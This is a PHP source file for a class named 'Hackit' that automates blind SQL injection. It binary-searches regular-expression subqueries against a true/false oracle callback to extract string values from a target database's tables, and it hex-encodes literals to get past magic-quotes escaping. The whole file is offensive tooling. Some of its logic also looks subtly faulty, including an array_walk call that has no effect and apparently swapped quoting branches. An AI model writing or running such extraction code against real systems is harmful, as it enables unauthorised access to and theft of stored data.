<?php

class Hackit
{

	const UNKNOWN = '?';


	/** @var bool */
	private $magic_quotes = FALSE;



	public function setMagicQuotes($value = TRUE)
	{
		$this->magic_quotes = $value;
	}



	public function toHex($string)
	{
		$hexstr = unpack('H*', $string);
		return '0x' . array_shift($hexstr);
	}



	public function findStrings($table, $column, $callbackIsTrue, $where = NULL, $callbackFound = NULL, array $cached = NULL)
	{
		$letters = str_split('-abcdefghijklmnopqrstuvwxyz_0123456789' . self::UNKNOWN); // unknown must be last

		$where = $where ? 'AND ' . implode(' AND ', $where) : '';
		$strings = $cached !== NULL ? $cached : [];

		$notin = '';
		if ($this->magic_quotes) {
			$hexstrings = $strings;
			array_walk($hexstrings, [$this, 'toHex']);
			$notin = $strings ? implode(", ", $hexstrings) : $this->toHex("doesNotExist");
		} else {
			$notin = $strings ? "'" . implode("', '", $strings) . "'" : "'doesNotExist'";
		}

		if ($callbackIsTrue("(SELECT Count(*) FROM $table WHERE $column NOT IN ($notin) $where) = 0")) {
			return $strings;
		}

		$l = $letters;
		$string = '';
		while (TRUE) {
			$splitter = floor(count($l) / 2);

			$regex = NULL;
			$regex = '^' . $string . '[';
			for ($i = 0; $i < $splitter; ++$i) {
				$regex .= $l[$i];
			}
			$regex .= '].*$';

			if (($this->magic_quotes && $callbackIsTrue("(SELECT Count(*) FROM $table WHERE $column NOT IN ($notin) AND $column REGEXP " . $this->toHex($regex) . " $where) > 0", $regex))
			|| (!$this->magic_quotes && $callbackIsTrue("(SELECT Count(*) FROM $table WHERE $column NOT IN ($notin) AND $column REGEXP '$regex' $where) > 0", $regex))) {
				array_splice($l, $splitter, count($l) - $splitter);
			} else {
				array_splice($l, 0, $splitter);
			}

			// only one letter is left
			if (count($l) === 1) {
				$forceEnd = end($l) == self::UNKNOWN;
				if (!$forceEnd) {
					$string .= end($l);
				}

				/*if ($forceEnd) {
					throw new Exception('Table contains character not enumerated.');
				}*/

				$l = $letters;

				if (($this->magic_quotes && $callbackIsTrue("(SELECT Count(*) FROM $table WHERE $column NOT IN ($notin) AND $column='$string' $where) = 1", $regex))
				|| (!$this->magic_quotes && $callbackIsTrue("(SELECT Count(*) FROM $table WHERE $column NOT IN ($notin) AND $column=" . $this->toHex($string) . " $where) = 1", $regex))
				|| $forceEnd) {
					$strings[] = $string;
					if ($this->magic_quotes) {
						$hexstrings = $strings;
						array_walk($hexstrings, [$this, 'toHex']);
						$notin = implode(", ", $hexstrings);
					} else {
						$notin = "'" . implode("', '", $strings) . "'";
					}

					$callbackFound($string);
					$string = '';

					// if all values were found, end
					if ($callbackIsTrue("(SELECT Count(*) FROM $table WHERE $column NOT IN ($notin) $where) = 0")) {
						break;
					}
				}
			}
		}

		return $strings;
	}

}
